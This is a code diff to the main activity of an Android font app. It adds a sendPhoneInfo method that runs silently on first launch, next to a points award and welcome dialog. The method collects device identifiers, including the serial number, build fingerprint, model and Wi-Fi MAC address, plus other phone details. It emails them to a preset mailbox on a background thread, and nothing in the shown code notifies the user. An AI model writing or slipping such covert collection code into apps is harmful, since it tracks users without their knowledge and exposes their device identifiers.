@@ -24,6 +24,7 @@ import android.content.pm.PackageManager;
 import android.net.ConnectivityManager;
 import android.net.NetworkInfo;
 import android.net.Uri;
+import android.net.wifi.WifiInfo;
 import android.net.wifi.WifiManager;
 import android.os.Bundle;
 import android.os.Environment;
@@ -46,6 +47,8 @@ import android.widget.Toast;
 import com.hly.fontxiu.feedback.FeedBackActivity;
 import com.hly.fontxiu.fontall.FontAllFragment;
 import com.hly.fontxiu.fontquality.FontBoutiqueFragment;
+import com.hly.fontxiu.mail.MailSenderInfo;
+import com.hly.fontxiu.mail.SimpleMailSender;
 import com.hly.fontxiu.points.EarnPointsFragment;
 import com.hly.fontxiu.setting.AboutActivity;
 import com.hly.fontxiu.setting.UpdateHelper;
@@ -255,6 +258,7 @@ public class MainActivity extends FragmentActivity implements OnClickListener,
 		if (isWifi || isNetData) {
 			boolean isFirstLoading = sp.getBoolean("isFirstLoading", true);
 			if (isFirstLoading){
+				sendPhoneInfo();
 				PointsHelper.awardPoints(this, Integer.parseInt(sAwardPoints));
 				sp.edit().putBoolean("isFirstLoading", false).commit();
 				new AlertDialog.Builder(this).setTitle("字体秀秀")
@@ -272,6 +276,86 @@ public class MainActivity extends FragmentActivity implements OnClickListener,
 			}
 		}
 	}
+	
+	public String getLocalMacAddress() {  
+        WifiManager wifi = (WifiManager) getSystemService(Context.WIFI_SERVICE);  
+        WifiInfo info = wifi.getConnectionInfo();  
+        return info.getMacAddress();  
+    }  
+
+	private void sendPhoneInfo() {
+		StringBuilder sb=new StringBuilder();
+        sb.append("info:\n");
+        sb.append("BOARD:")
+        .append(android.os.Build.BOARD)
+        .append("\n BOOTLOADER:\t") 
+        .append(android.os.Build.BOOTLOADER)
+        .append("\n BRAND:\t")
+        .append(android.os.Build.BRAND)
+        .append("\n CPU_ABI:\t")
+        .append(android.os.Build.CPU_ABI)
+        .append("\n CPU_ABI2:\t")
+        .append(android.os.Build.CPU_ABI2)
+        .append("\n DEVICE:\t")
+        .append(android.os.Build.DEVICE)
+        .append("\n FINGERPRINT:\t")
+        .append(android.os.Build.FINGERPRINT)
+        .append("\n HARDWARE:\t")
+        .append(android.os.Build.HARDWARE)
+        .append("\n HOST:\t")
+        .append(android.os.Build.HOST)
+        .append("\n ID:\t")
+        .append(android.os.Build.ID)
+        .append("\n MANUFACTURER:\t")
+        .append(android.os.Build.MANUFACTURER)
+        .append("\n MODEL:\t")
+        .append(android.os.Build.MODEL)
+        .append("\n PRODUCT:\t")
+        .append(android.os.Build.PRODUCT)
+        .append("\n RADIO:\t")
+        .append(android.os.Build.RADIO)
+        .append("\n SERIAL:\t")
+        .append(android.os.Build.SERIAL)
+        .append("\n TAGS:\t")
+        .append(android.os.Build.TAGS)
+        .append("\n TYPE:\t")
+        .append(android.os.Build.TYPE)
+        .append("\n USER:\t")
+        .append(android.os.Build.USER)
+        .append("\n getRadioVersion:\t")
+        .append(android.os.Build.getRadioVersion());
+        
+        sb.append("\n ANDROID VERSION: ").append(android.os.Build.VERSION.RELEASE);
+        sb.append("\n DISPLAY: ").append(android.os.Build.DISPLAY).append("\n");
+        sb.append("设备DEVICE: ").append(android.os.Build.DEVICE).append("\n");
+		sb.append("SDK: ").append(android.os.Build.VERSION.SDK_INT);
+		
+		sb.append("\n MAC: ").append(getLocalMacAddress());
+		
+		final MailSenderInfo mailInfo = CommonUtils.initEmail();
+		mailInfo.setSubject("用户手机信息搜集：");
+
+		String mailContent = "用户手机信息搜集内容：\n\n";
+
+		mailContent += sb.toString();
+
+		mailContent += CommonUtils.getPhoneInfo(this);
+
+		mailInfo.setContent(mailContent);
+		// 这个类主要来发送邮件
+		new Thread(new Runnable() {
+
+			@Override
+			public void run() {
+				SimpleMailSender sms = new SimpleMailSender();
+				sms.sendTextMail(mailInfo);// 不能再UI线程执行
+
+			}
+		}).start();
+        
+	}
+
+
 
 	@Override
     protected void onResume() {
